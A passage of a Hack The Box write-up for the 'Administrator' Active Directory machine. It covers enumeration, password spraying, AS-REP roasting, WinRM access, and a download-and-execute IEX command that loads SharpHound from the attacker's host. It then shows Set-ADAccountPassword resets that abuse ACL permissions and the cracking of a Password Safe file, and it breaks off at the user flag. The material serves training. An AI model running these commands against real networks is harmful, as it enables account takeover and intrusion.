information:</p></div><div class="el-h2"><h2 data-heading="TCP/UDP Port 53: DNS Enumeration" dir="auto" class="heading" id="TCP/UDP_Port_53_DNS_Enumeration_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP/UDP Port 53: DNS Enumeration</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">dig</span> NS administrator.htb @10.10.11.42
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114001055.png" src="img/pasted-image-20251114001055.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114001055.png" src="img/pasted-image-20251114001055.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the <code>DNS</code> request was performed to enumerate <code>NS</code> records, it returned <code>dc.administrator.htb</code>, which is the <code>FQDN</code> of the Domain Controller. This <code>hostname</code> should also be added to <code>/etc/hosts</code> so the machine can resolve the IP address <code>10.10.11.42</code> as both <code>administrator.htb</code> and <code>dc.administrator.htb</code>.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114001130.png" src="img/pasted-image-20251114001130.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114001130.png" src="img/pasted-image-20251114001130.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">With both names identified, it is time to begin a further enumeration of the <code>SMB</code> service using the credentials provided by the machine info from Hack The Box. Because this pentest aims to resemble a real scenario, the credentials <code>oliva:ichliebedich</code> are provided:</p></div><div class="el-h2"><h2 data-heading="TCP Port 445: SMB Enumeration Using Provided Credentials" dir="auto" class="heading" id="TCP_Port_445_SMB_Enumeration_Using_Provided_Credentials_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 445: SMB Enumeration Using Provided Credentials</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">netexec smb <span class="token number">10.10</span>.11.42 <span class="token parameter variable">-u</span> <span class="token string">'olivia'</span> <span class="token parameter variable">-p</span> <span class="token string">'ichliebedich'</span> <span class="token parameter variable">--users</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114002420.png" src="img/pasted-image-20251114002420.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114002420.png" src="img/pasted-image-20251114002420.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">First, the domain users were enumerated through the <code>SMB</code> service. Since a long list of accounts was retrieved, the output will be saved into a separate file that contains all of them.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">netexec smb <span class="token number">10.10</span>.11.42 <span class="token parameter variable">-u</span> <span class="token string">'olivia'</span> <span class="token parameter variable">-p</span> <span class="token string">'ichliebedich'</span> <span class="token parameter variable">--users</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $5}'</span> <span class="token operator">|</span> <span class="token function">tail</span> <span class="token parameter variable">-n</span> +4 <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-1</span> <span class="token operator">&gt;</span> users.txt
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114003304.png" src="img/pasted-image-20251114003304.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114003304.png" src="img/pasted-image-20251114003304.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">With this user list, a <code>password spraying attack</code> can be performed. Since a valid password is already known (Olivia’s password), it might also work for other users. Therefore, a spray attempt will be carried out to verify this.</p></div><div class="el-h1"><h1 data-heading="Exploitation" dir="auto" class="heading" id="Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Exploitation</h1></div><div class="el-h2"><h2 data-heading="TCP Port 445: SMB Password Spraying Attack (Failed)" dir="auto" class="heading" id="TCP_Port_445_SMB_Password_Spraying_Attack_(Failed)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 445: SMB Password Spraying Attack (Failed)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">netexec smb <span class="token number">10.10</span>.11.42 <span class="token parameter variable">-u</span> users.txt <span class="token parameter variable">-p</span> <span class="token string">'ichliebedich'</span> --continue-on-success
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114003420.png" src="img/pasted-image-20251114003420.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114003420.png" src="img/pasted-image-20251114003420.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>password spraying attack</code> did not reveal any users reusing the same password; only Olivia’s credentials were valid. As a next step, an<code> AS‑REP Roasting</code> attack will be conducted to identify any users who do not require <code>pre‑authentication</code>. If such accounts exist, their <code>TGT</code> can be collected and later analyzed offline with password‑cracking tools such as <code>hashcat</code>.</p></div><div class="el-h2"><h2 data-heading="TCP/UDP Port 88: AS-REP Roasting Attack (Failed)" dir="auto" class="heading" id="TCP/UDP_Port_88_AS-REP_Roasting_Attack_(Failed)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP/UDP Port 88: AS-REP Roasting Attack (Failed)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">ntpdate administrator.htb
GetNPUsers.py administrator.htb/ -no-pass <span class="token parameter variable">-usersfile</span> users.txt
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114004132.png" src="img/pasted-image-20251114004132.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114004132.png" src="img/pasted-image-20251114004132.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To perform the attack, it was first necessary to synchronize the clock of the attacker machine with the target machine, because <code>timestamps</code> are an essential part of requesting a <code>TGT</code> and must match the target’s clock. Next, the attack was performed and no users disclosed their <code>TGT</code>, so the attack failed. At this point, Olivia’s credentials will be checked to see if they are valid for obtaining an interactive <code>shell</code> via the <code>SMB</code> or <code>WinRM</code> services:</p></div><div class="el-h2"><h2 data-heading="TCP Port 5985: Initial Access Using `evil-winrm`" dir="auto" class="heading" id="TCP_Port_5985_Initial_Access_Using_`evil-winrm`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 5985: Initial Access Using <code>evil-winrm</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">netexec smb <span class="token number">10.10</span>.11.42 <span class="token parameter variable">-u</span> <span class="token string">'olivia'</span> <span class="token parameter variable">-p</span> <span class="token string">'ichliebedich'</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
netexec winrm <span class="token number">10.10</span>.11.42 <span class="token parameter variable">-u</span> <span class="token string">'olivia'</span> <span class="token parameter variable">-p</span> <span class="token string">'ichliebedich'</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
evil-winrm <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.11.42 <span class="token parameter variable">-u</span> <span class="token string">'olivia'</span> <span class="token parameter variable">-p</span> <span class="token string">'ichliebedich'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114001442.png" src="img/pasted-image-20251114001442.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114001442.png" src="img/pasted-image-20251114001442.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The credentials were valid for the <code>WinRM</code> service, so they were used to obtain a <code>PowerShell</code> session using <code>evil-winrm</code>. Next, the <code>Active Directory</code> environment will be enumerated using <code>bloodhound</code> as follows:</p></div><div class="el-h1"><h1 data-heading="Post-Exploitation" dir="auto" class="heading" id="Post-Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Post-Exploitation</h1></div><div class="el-h2"><h2 data-heading="Active Directory Enumeration Using `bloodhound`" dir="auto" class="heading" id="Active_Directory_Enumeration_Using_`bloodhound`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Active Directory Enumeration Using <code>bloodhound</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">cp</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">locate</span> SharpHound.ps1 <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span><span class="token variable">)</span></span> <span class="token builtin class-name">.</span>
python3 <span class="token parameter variable">-m</span> https.server <span class="token number">80</span>
IEX<span class="token punctuation">(</span>New-object Net.WebClient<span class="token punctuation">)</span>.downloadString<span class="token punctuation">(</span><span class="token string">'http://10.10.16.6/SharpHound.ps1'</span><span class="token punctuation">)</span>
Invoke-BloodHound <span class="token parameter variable">-CollectionMethod</span> All
download 20251114112509_BloodHound.zip
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114132641.png" src="img/pasted-image-20251114132641.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114132641.png" src="img/pasted-image-20251114132641.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To begin the enumeration with <code>BloodHound</code>, the first step is to collect the <code>Active Directory</code> information using <code>Sharphound.ps1</code>. This script creates a <code>.zip</code> file containing all the <code>Active Directory</code> data, which will then be decompressed and interpreted by <code>BloodHound</code>. As shown in the image, it was shared with the target machine, executed, the <code>.zip</code> file was created and downloaded to the attacker machine, and then it will be uploaded to <code>BloodHound</code>:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">update-alternatives <span class="token parameter variable">--config</span> <span class="token function">java</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114133813.png" src="img/pasted-image-20251114133813.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114133813.png" src="img/pasted-image-20251114133813.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Before starting <code>BloodHound</code>, it is important to adjust the system’s <code>Java</code> version; in this case, <code>Java 11</code> was selected. Then, to start the tool, <code>Neo4j</code> must also be launched, followed by <code>BloodHound</code>:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">bloodhound
neo4j console
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114133936.png" src="img/pasted-image-20251114133936.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114133936.png" src="img/pasted-image-20251114133936.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The application started correctly and requested the credentials. Once provided, the <code>.zip</code> file containing the data can be uploaded.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114134044.png" src="img/pasted-image-20251114134044.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114134044.png" src="img/pasted-image-20251114134044.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the <code>.zip</code> file was successfully uploaded, the enumeration will then begin as follows:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114134218.png" src="img/pasted-image-20251114134218.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114134218.png" src="img/pasted-image-20251114134218.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">First, to better represent the entire <code>Active Directory</code> environment, the user <code>Olivia</code> was marked as owned. For each owned user, it is recommended to do this. Next, this user will be enumerated to check if she can pivot to another user or perform any privileged action:</p></div><div class="el-h2"><h2 data-heading="User Pivoting" dir="auto" class="heading" id="User_Pivoting_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>User Pivoting</h2></div><div class="el-h3"><h3 data-heading="Abusing the `GenericAll` Permission – Changing a User’s Current Password" dir="auto" class="heading" id="Abusing_the_`GenericAll`_Permission_–_Changing_a_User’s_Current_Password_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Abusing the <code>GenericAll</code> Permission – Changing a User’s Current Password</h3></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114135025.png" src="img/pasted-image-20251114135025.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114135025.png" src="img/pasted-image-20251114135025.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the <code>First Degree Object Control</code> was enumerated, it was revealed that <code>Olivia</code> has been assigned the <code>GenericAll</code> permission over the user <code>Michael</code>. This permission allows many actions, for example: changing the user’s password without knowing the current one, modifying any attribute of the user, adding or removing <code>SPNs</code> associated with the user, etc. However, the easiest way to pivot to this user is to change his current password to one known by us. This can be done as follows:</p></div><div class="el-pre"><pre class="language-powershell"><code data-line="0" class="language-powershell is-loaded"><span class="token function">Set-ADAccountPassword</span> <span class="token operator">-</span>Identity michael <span class="token operator">-</span>Reset <span class="token operator">-</span>NewPassword <span class="token punctuation">(</span><span class="token function">ConvertTo-SecureString</span> <span class="token string">"kmn1234"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token punctuation">)</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114134726.png" src="img/pasted-image-20251114134726.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114134726.png" src="img/pasted-image-20251114134726.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Executing the command shown in the image, the password was successfully changed to <code>kmn1234</code>. Then, an interactive <code>shell</code> can be obtained via the <code>WinRM</code> service using <code>evil-winrm</code>:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">evil-winrm <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.11.42 <span class="token parameter variable">-u</span> <span class="token string">'michael'</span> <span class="token parameter variable">-p</span> <span class="token string">'kmn1234'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114134825.png" src="img/pasted-image-20251114134825.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114134825.png" src="img/pasted-image-20251114134825.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Michael’s session was successfully obtained using the changed password. Then, this user will be marked as owned and enumerated to determine whether he has any permission that allows him to perform a privileged action or something similar:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114135055.png" src="img/pasted-image-20251114135055.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114135055.png" src="img/pasted-image-20251114135055.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the user was marked as owned, it will then be enumerated:</p></div><div class="el-h3"><h3 data-heading="Abusing `ForceChangePassword` Permission – Changing a User’s Current Password" dir="auto" class="heading" id="Abusing_`ForceChangePassword`_Permission_–_Changing_a_User’s_Current_Password_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Abusing <code>ForceChangePassword</code> Permission – Changing a User’s Current Password</h3></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114135650.png" src="img/pasted-image-20251114135650.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114135650.png" src="img/pasted-image-20251114135650.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Just like the user <code>Olivia</code>, the user <code>Michael</code> also has one first‑degree object control over the user <code>Benjamin</code>. Specifically, he has the <code>ForceChangePassword</code> permission, which, as the property name indicates, allows a user to change another user’s current password without knowing it. The command that can be executed to perform this action is the following:</p></div><div class="el-pre"><pre class="language-powershell"><code data-line="0" class="language-powershell is-loaded"><span class="token function">Set-ADAccountPassword</span> <span class="token operator">-</span>Identity benjamin <span class="token operator">-</span>Reset <span class="token operator">-</span>NewPassword <span class="token punctuation">(</span><span class="token function">ConvertTo-SecureString</span> <span class="token string">"benjamin123"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token punctuation">)</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114135935.png" src="img/pasted-image-20251114135935.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114135935.png" src="img/pasted-image-20251114135935.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the command was executed, the password was successfully changed. At this point, it is important to note that the user <code>Benjamin</code> is not a system user, so he can obtain an interactive <code>shell</code>. Relating this to information gathered during the pentest process, it was remembered that the <code>FTP</code> service was open, and maybe the user <code>Benjamin</code> can log in using the newly changed password. Let’s check it:</p></div><div class="el-h3"><h3 data-heading="TCP Port 21: FTP Enumeration - ``.psafe3`` File Discovered" dir="auto" class="heading" id="TCP_Port_21_FTP_Enumeration_-_``.psafe3``_File_Discovered_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 21: FTP Enumeration - <code>.psafe3</code> File Discovered</h3></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114140248.png" src="img/pasted-image-20251114140248.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114140248.png" src="img/pasted-image-20251114140248.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">And indeed, the user <code>Benjamin</code> was able to log in to the <code>FTP</code> service, where an interesting file was discovered: a <code>.psafe3</code> file. When information about this file type was searched, it was found that it is a file that contains user passwords and works similarly to <code>KeePass</code>. However, the file cannot be opened to retrieve the stored passwords because it is protected with a master password. But, as with many password‑protected files, there are <code>2john</code> commands that allow extracting the <code>hash</code> of the password protecting the file so it can later be cracked. This process will be shown below:</p></div><div class="el-h3"><h3 data-heading="Extracting the Hash from the PSafe3 File and Cracking It Using `pwsafe2john` &amp; `john`" dir="auto" class="heading" id="Extracting_the_Hash_from_the_PSafe3_File_and_Cracking_It_Using_`pwsafe2john`_&amp;_`john`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Extracting the Hash from the PSafe3 File and Cracking It Using <code>pwsafe2john</code> &amp; <code>john</code></h3></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">pwsafe2john Backup.psafe3 <span class="token operator">&gt;</span> <span class="token builtin class-name">hash</span>
john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt <span class="token builtin class-name">hash</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114141149.png" src="img/pasted-image-20251114141149.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114141149.png" src="img/pasted-image-20251114141149.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The hash was successfully retrieved and then cracked using <code>john</code>, revealing the password <code>tekieromucho</code>. Then, the <code>.psafe3</code> file will be opened and the passwords it contains will be provided:</p></div><div class="el-h3"><h3 data-heading="Opening the PSafe3 File with Password Safe and Viewing the User Credentials" dir="auto" class="heading" id="Opening_the_PSafe3_File_with_Password_Safe_and_Viewing_the_User_Credentials_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Opening the PSafe3 File with Password Safe and Viewing the User Credentials</h3></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">pwsafe Backup.psafe3
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114141251.png" src="img/pasted-image-20251114141251.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114141251.png" src="img/pasted-image-20251114141251.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114141514.png" src="img/pasted-image-20251114141514.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114141514.png" src="img/pasted-image-20251114141514.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The password worked, and once inside the file, a message appeared indicating “Double‑Click on entry to Copy Password.” So, a local file was created, and all the passwords for the users <code>alexander</code>, <code>emily</code>, and <code>emma</code> were pasted into it. Then, the password of the user <code>Emily</code>, who is a system user and can obtain an interactive <code>shell</code>, will be used to gain one:</p></div><div class="el-h3"><h3 data-heading="User Flag" dir="auto" class="heading" id="User_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>User Flag</h3></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251114141619.png" src="img/pasted-image-20251114141619.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251114141619.png" src="img/pasted-image-20251114141619.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The credentials worked, and an interactive <code>shell</code> through the <code>WinRM</code> service was obtained as the user 